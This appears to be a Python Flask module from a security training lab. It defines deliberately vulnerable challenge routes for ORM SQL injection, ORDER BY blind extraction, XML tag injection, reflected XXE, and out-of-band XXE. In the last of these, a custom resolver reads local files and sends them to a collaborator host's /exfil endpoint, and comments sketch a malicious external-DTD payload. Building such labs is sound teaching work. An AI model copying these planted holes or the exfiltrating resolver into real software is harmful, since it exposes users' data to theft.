"""
challenges/phase5.py, Phase 5, "Chimera Ant Palace" (Conjuration).

Task 5.1 lands the first floor: p5_1 "Manipulator's Firewall", ORM injection
(notes §10) against real MariaDB through a real SQLAlchemy engine, a
different bug shape from every earlier phase again. Phases 1-3 were classic
SQL injection built by the app's own string concatenation with zero ORM in
the picture. Phase 4 moved to backends (Mongo, LDAP) with no SQL string at
all. This floor puts an ORM *in front of* SQL again, and shows that an ORM
is not automatically a fix: SQLAlchemy parameterizes everything that goes
through its normal query-building API (`.filter(Model.col == value)`), but
it also exposes raw-SQL escape hatches (`text()`, `.from_statement()`,
`.filter(text(...))`) for the cases its own API can't express, and a raw,
hand-built f-string handed to one of those hatches is exactly as injectable
as `cursor.execute("... " + user_input)` would have been with no ORM at
all. The ORM adds a layer of abstraction; it does not add a validation
layer of its own.

Later Phase-5 tasks (p5_2 XML injection, p5_3 XXE) append their routes to
this same blueprint, keep each challenge's route + helpers scoped to its
own block, same append-only-friendly convention as phase1.py..phase4.py.
"""

from __future__ import annotations

import os

import requests

from flask import Blueprint, Response, jsonify, render_template, request
from lxml import etree
from sqlalchemy import Column, Integer, String, create_engine, text
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.orm import declarative_base, sessionmaker

from core import xml_parser
from core.db import mysql_conn

COLLABORATOR_BASE = "http://collaborator"

bp = Blueprint("phase5", __name__)
phase5_bp = bp


# ---------------------------------------------------------------------------
# p5_1, Manipulator's Firewall
# ---------------------------------------------------------------------------
#
# A thin SQLAlchemy layer of its own (not core/db.py's raw pymysql helper:
# this floor is specifically about the ORM's own raw-SQL escape hatch, so it
# needs a real ORM session, not a bare connection). Engine creation is
# lazy (module-level function, not a module-level engine) so importing this
# blueprint never requires MariaDB to already be reachable, matches how
# core/db.py's connection helpers are also called per-request, not opened
# at import time.

Base = declarative_base()


class FirewallUser(Base):
    __tablename__ = "firewall_users"

    id = Column(Integer, primary_key=True)
    username = Column(String(64))
    password = Column(String(64))
    role = Column(String(32))
    secret = Column(String(128))


_SessionLocal = None


def _get_session():
    global _SessionLocal
    if _SessionLocal is None:
        host = os.environ.get("MARIADB_HOST", "mariadb")
        port = os.environ.get("MARIADB_PORT", "3306")
        # This floor's own isolated database + restricted user, the same
        # per-challenge convention core/db.py's mysql_conn() follows and
        # that seed/mariadb/11_firewall.sql creates. The user's grants are
        # confined to seiyaku_p5_firewall, so even the ORM's raw-SQL escape
        # hatch can't reach another challenge's tables or flags.
        user = "svc_p5_firewall"
        password = "p5_firewall_pw"
        database = "seiyaku_p5_firewall"
        engine = create_engine(
            f"mysql+pymysql://{user}:{password}@{host}:{port}/{database}"
        )
        _SessionLocal = sessionmaker(bind=engine)
    return _SessionLocal()


def _resolve_credentials():
    """Pull `username`/`password` out of the request, from whichever
    channel the caller used: a JSON body or a form-encoded POST body,
    same dual-channel convention as phase4.py's _resolve_login_credentials.
    Unlike phase4, both fields here are always coerced to `str` (or the
    empty string) before they ever reach the query: this floor's bug is a
    string-context SQL injection, not a NoSQL type-confusion, so an
    operator-object payload (`username[$ne]=1`) simply becomes the literal
    text "{'$ne': '1'}" in the SQL string rather than doing anything
    special, the interesting payload here is a quote character, not a
    JSON/Mongo operator."""
    if request.is_json:
        payload = request.get_json(silent=True) or {}
        username = payload.get("username", "")
        password = payload.get("password", "")
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")
    return str(username), str(password)


def _public_user(user: FirewallUser) -> dict:
    """The curated view of a matched account: identity + role, never the
    stored password, and `secret` only when it's actually non-empty (only
    true for the chairman row), same "only the flag row ever carries a
    non-empty secret" convention as p3_2's vault_cards and p4's agent/member
    views."""
    return {
        "username": user.username,
        "role": user.role,
        "secret": user.secret or None,
    }


@bp.route("/p5/firewall", methods=["GET", "POST"])
def p5_firewall():
    matched = None
    error = None
    attempted = False
    submitted_username = None

    if request.method == "POST":
        attempted = True
        username, password = _resolve_credentials()
        submitted_username = username

        db = _get_session()
        try:
            # VULN: the ORM's real, parameterized filter API
            # (.filter(FirewallUser.username == username)) is never used
            # here. Instead the two fields are spliced with an f-string
            # directly into a text() clause, text() executes exactly the
            # SQL string it's handed, and nothing about it parameterizes
            # values baked into that string before it's ever constructed.
            # A plain username/password (no quote characters) produces an
            # ordinary two-column equality check; a username containing
            # `'` lets a caller close the string early and add SQL logic
            # of their own, exactly like p1_1's raw-concatenation bug;
            # the only thing that changed is which layer built the string.
            clause = text(
                f"username = '{username}' AND password = '{password}'"
            )
            matched = db.query(FirewallUser).filter(clause).first()
        except SQLAlchemyError:
            matched = None
            error = "the firewall rejected that request"
        finally:
            db.close()

    wants_json = request.method == "POST" and (
        request.is_json or request.headers.get("Accept") == "application/json"
    )
    public_user = _public_user(matched) if matched else None

    if wants_json:
        return jsonify(
            success=matched is not None,
            username=submitted_username,
            user=public_user,
            error=error,
        )

    return render_template(
        "p5_firewall.html",
        attempted=attempted,
        success=matched is not None,
        user=public_user,
        error=error,
        submitted_username=submitted_username,
    )


# ---------------------------------------------------------------------------
# p5_2, Palace Blueprint Tampering
# ---------------------------------------------------------------------------
#
# p5_1's bug was in what got interpolated into a SQL string. This floor's
# bug (notes §11, "XML (Tag) Injection") happens one step earlier and in a
# completely different grammar: a *visitor name* is spliced into an XML
# document template with a plain Python .format() call, with none of XML's
# five reserved metacharacters (< > & ' ") escaped first. A well-formed XML
# document has exactly one meaning once parsed, but the string handed to
# the parser here was never guaranteed to stay well-formed in the way the
# template's author assumed, because nothing stops a visitor name from
# containing its own `<tag>` markup. If it does, that markup isn't treated
# as literal text describing a visitor's name, it becomes real sibling
# structure the parser reads as part of the document, exactly as if the
# Palace's own printing press had written it there itself.
#
# core/xml_parser.parse() is used here (not a bespoke parser) even though
# this floor's bug doesn't need DTD/entity support at all, see that
# module's docstring for why one shared, equally-unsafe parser
# configuration is used across every XML-consuming route in this phase.

_GUEST_BADGE_TEMPLATE = (
    "<badge><visitor>{name}</visitor><clearance>guest</clearance></badge>"
)


def _lookup_clearance(level: str | None) -> dict | None:
    """Look up a clearance level against the real, seeded
    `palace_clearances` table, a plain parameterized query, deliberately
    the *safe* half of this route. The vulnerability lives entirely
    upstream, in how `level` was ever produced (see p5_blueprint below);
    once a level string exists, fetching its record is not itself
    attacker-influenced construction of a query, just a normal lookup.
    Only the `royal` row's `flag` column is ever non-empty, same
    "only the flag row carries a non-empty secret" convention as every
    earlier phase's seed data."""
    if not level:
        return None
    conn = mysql_conn("p5_blueprint")
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT level, description, flag FROM palace_clearances WHERE level = %s",
                (level,),
            )
            return cur.fetchone()
    finally:
        conn.close()


@bp.route("/p5/blueprint", methods=["GET", "POST"])
def p5_blueprint():
    badge = None
    error = None
    submitted_name = None
    raw_xml = None
    clearance_row = None

    if request.method == "POST":
        name = request.form.get("name", "")
        submitted_name = name

        # VULN: `name` is spliced directly into an XML string template
        # with a plain .format() call, no escaping of `< > & ' "`
        # anywhere before the result is handed to the parser. A name
        # containing its own closing/opening tags doesn't stay text
        # content; it becomes new markup alongside the fixed
        # <clearance>guest</clearance> element this template always
        # appends.
        raw_xml = _GUEST_BADGE_TEMPLATE.format(name=name)

        try:
            doc = xml_parser.parse(raw_xml.encode("utf-8"))
            clearance_el = doc.find(".//clearance")
            visitor_el = doc.find(".//visitor")
            badge = {
                "visitor": visitor_el.text if visitor_el is not None else None,
                "clearance": clearance_el.text if clearance_el is not None else None,
            }
            # "royal" is a clearance level this route's own logic never
            # writes into any badge on its own, the template only ever
            # emits <clearance>guest</clearance>. The only way
            # badge["clearance"] is ever anything else is if the parsed
            # document ended up with more than one <clearance> element,
            # and lxml's `.find()` returned an injected one because it
            # appears earlier in document order than the template's own
            # fixed element.
            clearance_row = _lookup_clearance(badge.get("clearance"))
            if clearance_row:
                badge["clearance_description"] = clearance_row.get("description")
        except etree.XMLSyntaxError as exc:
            error = f"the blueprint press rejected that badge: {exc}"

    flag = (clearance_row.get("flag") if clearance_row else None) or None

    wants_json = request.method == "POST" and (
        request.is_json or request.headers.get("Accept") == "application/json"
    )

    if wants_json:
        return jsonify(
            success=flag is not None,
            visitor=submitted_name,
            badge=badge,
            raw_xml=raw_xml,
            flag=flag,
            error=error,
        )

    return render_template(
        "p5_blueprint.html",
        attempted=request.method == "POST",
        badge=badge,
        raw_xml=raw_xml,
        flag=flag,
        error=error,
        submitted_name=submitted_name,
    )


# ---------------------------------------------------------------------------
# p5_3, The King's Sealed Archives
# ---------------------------------------------------------------------------
#
# p5_2's bug lived entirely upstream of the parser, in how a document was
# ever *built*. This floor's bug (notes §11, "XXE") lives in the parser's
# own configuration: core/xml_parser.parse() sets `resolve_entities=True`
# and `load_dtd=True`, which together mean a caller-supplied document is
# free to declare its own DOCTYPE with its own <!ENTITY> definitions, and
# a `SYSTEM` entity's value isn't a literal string the way an internal
# entity's is, it's a *reference the parser goes and resolves itself*,
# including `file://` URIs pointing anywhere on the local filesystem the
# app's own process can read. Whatever that resolved content is then
# becomes indistinguishable, to the rest of the parsed tree, from text the
# caller typed directly, so anything the route echoes back out of the
# document echoes the file's contents right along with it.
#
# The route below is a deliberately ordinary "archive request" feature: a
# caller submits a small XML document naming a document title they want
# summarized, and the route echoes that title back in its response. There
# is nothing suspicious about that feature on its own, the vulnerability
# is entirely in *how* the title is read out of the document (a resolved
# entity reads identically to plain text) and in the shared parser
# configuration this whole phase uses (core/xml_parser.py).

@bp.route("/p5/archives", methods=["GET", "POST"])
def p5_archives():
    document_title = None
    error = None
    raw_xml = None

    if request.method == "POST":
        raw_xml = request.form.get("xml", "")
        try:
            # VULN: this is the exact same core.xml_parser.parse() call
            # p5_2 used, with the exact same resolve_entities=True,
            # load_dtd=True configuration, but this floor's route
            # reflects an element's resolved .text back in its response,
            # which is what turns "the parser will resolve a SYSTEM
            # entity" into "the app will hand you the resolved file
            # content." p5_2 never had a route that echoed parsed
            # content back at all, so the same parser posture was inert
            # there, the sink, not just the parser config, is what
            # makes a bug reachable.
            doc = xml_parser.parse(raw_xml.encode("utf-8"))
            title_el = doc.find(".//document")
            document_title = title_el.text if title_el is not None else None
        except etree.XMLSyntaxError as exc:
            error = f"the archive rejected that request: {exc}"

    wants_json = request.method == "POST" and (
        request.headers.get("Accept") == "application/json"
    )

    if wants_json:
        return jsonify(
            document_title=document_title,
            raw_xml=raw_xml,
            error=error,
        )

    return render_template(
        "p5_archives.html",
        attempted=request.method == "POST",
        document_title=document_title,
        raw_xml=raw_xml,
        error=error,
    )


# ---------------------------------------------------------------------------
# p5_4, The Royal Guard Rankings
# ---------------------------------------------------------------------------
#
# p5_1 showed ORM injection in a *value* position: a quote closing a string
# literal the ORM's escape hatch spliced untrusted text into. This floor
# shows the second, genuinely distinct ORM-injection shape
# (learn-orm-injection.md §4): an *identifier* position. A bound parameter
# can only ever stand in for a value (`'alice'`), never for an identifier
# (a bare column name, an ORDER BY target). That position in SQL's own
# grammar has no placeholder syntax at all, so there is no parameterized
# form of "ORDER BY <whatever column the caller chose>"; the only correct
# defense is an allow-list of permitted columns checked in application
# code. This route doesn't allow-list: it splices the caller's `sort`
# straight into the ORDER BY clause via SQLAlchemy's text() escape hatch,
# so a caller can supply an entire ORDER BY *expression* (a CASE boolean
# oracle) instead of a column name, and read a value it was never shown by
# watching which roster row that expression sorts first.
#
# The flag lives in `royal_seal`, a table this route never SELECTs into any
# response. The only way to read it is to make the injected ORDER BY
# expression reference it via subquery and infer its contents one character
# at a time, a blind extraction off an ordering oracle, the same
# bisection idea as p4_4's timing oracle, read off row order instead of a
# clock.


class GuardRoster(Base):
    __tablename__ = "guard_roster"

    id = Column(Integer, primary_key=True)
    name = Column(String(64))
    division = Column(String(64))


_RosterSessionLocal = None


def _get_roster_session():
    global _RosterSessionLocal
    if _RosterSessionLocal is None:
        host = os.environ.get("MARIADB_HOST", "mariadb")
        port = os.environ.get("MARIADB_PORT", "3306")
        # This floor's own isolated database + restricted user (see
        # seed/mariadb/20_roster.sql). The ORDER BY subquery can reach
        # royal_seal only because it lives in this same database; the
        # restricted user is denied every other challenge's tables.
        user = "svc_p5_roster"
        password = "p5_roster_pw"
        database = "seiyaku_p5_roster"
        engine = create_engine(
            f"mysql+pymysql://{user}:{password}@{host}:{port}/{database}"
        )
        _RosterSessionLocal = sessionmaker(bind=engine)
    return _RosterSessionLocal()


@bp.route("/p5/roster", methods=["GET"])
def p5_roster():
    sort = request.args.get("sort", "id")
    error = None
    members = []

    db = _get_roster_session()
    try:
        # VULN: `sort` is spliced directly into the ORDER BY clause via
        # text(). This is an identifier/expression position, not a value
        # position: .order_by(GuardRoster.id) or a bound parameter cannot
        # express "order by a column the caller named," so the developer
        # reached for text() and handed it raw caller input. Unlike a
        # value injection, there is no "use a bound parameter instead"
        # fix here, the only correct fix is to reject any `sort` not on an
        # explicit allow-list of real column names before it ever reaches
        # the query (see the DEBRIEF's remediation). A plain column name
        # ("name", "division") sorts the roster as intended; an entire
        # ORDER BY expression (a CASE boolean oracle referencing
        # royal_seal) turns the visible row order into a one-bit readout
        # of a value this route never displays.
        rows = db.query(GuardRoster).order_by(text(sort)).all()
        members = [{"name": r.name, "division": r.division} for r in rows]
    except SQLAlchemyError:
        error = "the roster desk rejected that sort column"
    finally:
        db.close()

    wants_json = request.headers.get("Accept") == "application/json"

    if wants_json:
        return jsonify(sort=sort, members=members, error=error)

    return render_template(
        "p5_roster.html",
        sort=sort,
        members=members,
        error=error,
    )


# ---------------------------------------------------------------------------
# p5_5, The Silent Courier
# ---------------------------------------------------------------------------
#
# p5_3 (The King's Sealed Archives) was *reflected* XXE: the route echoed
# an element's resolved text back in its own HTTP response, so the attacker
# could read the file contents directly from the response body. This floor
# closes that in-band channel entirely: the route parses the caller's XML
# with a custom resolver, but its own response is always a fixed, generic
# "dispatch confirmed" message regardless of what the parsed document
# contained. No element text, no entity resolution result, nothing
# data-dependent ever reaches the HTTP response.
#
# The _OOBResolver class below is the attack surface: it enables both steps
# of the exfil chain:
#   1. HTTP entity resolution — the parser can fetch external DTDs from
#      the collaborator service.  An attacker payload that declares
#      %remote; = SYSTEM "http://collaborator/evil.dtd?f=/opt/king/dispatch.txt"
#      and then expands %remote; causes the parser to fetch that DTD.
#   2. File exfil — when the external DTD's %file; entity (SYSTEM
#      "file:///opt/king/dispatch.txt") is expanded, the resolver reads the
#      file and immediately fires GET http://collaborator/exfil?d=<contents>
#      before returning the content to the parser.  The route's own response
#      never carries that content.
#
# The lxml/libxml2 2.14.x resolver intercept is the realistic Python
# implementation of "the XML parser makes a network call during entity
# resolution."  Native libxml2 HTTP entity fetching requires an older
# libxml2 build; in modern lxml the application registers a custom
# etree.Resolver to mediate outbound fetches, which is what real Python
# applications with XXE vulnerabilities actually do.
#
# From the challenger's perspective the experience is identical to any
# OOB XXE: send XML with an external entity, get a blind response, check
# an out-of-band channel for the exfiltrated data.


class _OOBResolver(etree.Resolver):
    """Custom resolver for p5_5 OOB XXE.

    Handles two URL schemes that lxml does not resolve by default:

    http:// — fetches the external DTD or entity from the network, enabling
    the external-DTD step of the attack.  An attacker controls the
    collaborator's /evil.dtd?f=<path> endpoint to point the read at any
    file the app process can open.

    file:// — reads the local file the external DTD declared, and exfils its
    content to collaborator's /exfil?d=<data> BEFORE returning the content to
    the parser.  The parser's own return path (the route's HTTP response) is
    completely blind; the only evidence is the capture log entry.
    """

    def resolve(self, url, id, context):
        if url.startswith(("http://", "https://")):
            try:
                resp = requests.get(url, timeout=5)
                return self.resolve_string(resp.content, context, base_url=url)
            except Exception:
                return None

        if url.startswith("file://"):
            path = url[len("file://"):]
            try:
                with open(path, "rb") as fh:
                    raw = fh.read()
                data = raw.decode("utf-8", errors="replace")
                # OOB exfil: file content leaves via a collaborator request,
                # never via this route's own HTTP response.
                try:
                    requests.get(
                        f"{COLLABORATOR_BASE}/exfil",
                        params={"d": data},
                        timeout=3,
                    )
                except Exception:
                    pass
                return self.resolve_string(raw, context)
            except (OSError, IOError):
                pass

        return None


@bp.route("/p5/courier", methods=["GET", "POST"])
def p5_courier():
    dispatched = False
    error = None
    raw_xml = None

    if request.method == "POST":
        if request.is_json:
            payload = request.get_json(silent=True) or {}
            raw_xml = payload.get("xml", "")
        else:
            raw_xml = request.form.get("xml", "")

        try:
            # VULN: p5_5 uses its own parser (not the shared xml_parser.parse())
            # so it can register _OOBResolver, which implements the HTTP entity
            # fetch and the file→collaborator exfil chain.  The same unsafe
            # parser flags as the shared parser; the attack surface is the
            # resolver intercept, not the flags alone.
            # Critically, this route never echoes any element text: the
            # only observable result of a successful parse is "dispatched".
            oob_parser = etree.XMLParser(
                resolve_entities=True,
                load_dtd=True,
                no_network=False,
                huge_tree=False,
            )
            oob_parser.resolvers.add(_OOBResolver())
            etree.fromstring(raw_xml.encode("utf-8"), oob_parser)
            dispatched = True
        except etree.XMLSyntaxError as exc:
            error = f"the courier desk rejected that dispatch: {exc}"
        except etree.Error:
            error = "the courier desk rejected that dispatch"

    wants_json = request.method == "POST" and (
        request.is_json or request.headers.get("Accept") == "application/json"
    )

    if wants_json:
        return jsonify(dispatched=dispatched, error=error)

    return render_template(
        "p5_courier.html",
        attempted=request.method == "POST",
        dispatched=dispatched,
        raw_xml=raw_xml,
        error=error,
    )


@bp.route("/p5/courier/captures", methods=["GET"])
def p5_courier_captures():
    """Server-side proxy for collaborator's GET /captures.

    collaborator is reachable from Flask by its compose service name but
    not from a student's browser directly. This route fetches the capture
    feed server-side and hands the JSON straight back so the portal can
    poll a same-origin URL instead, same pattern as p3_spellcard_captures.
    """
    try:
        resp = requests.get(f"{COLLABORATOR_BASE}/captures", timeout=3)
        return Response(
            resp.content,
            status=resp.status_code,
            mimetype="application/json",
        )
    except Exception as exc:
        return Response(
            f'{{"error": {str(exc)!r}}}',
            status=502,
            mimetype="application/json",
        )
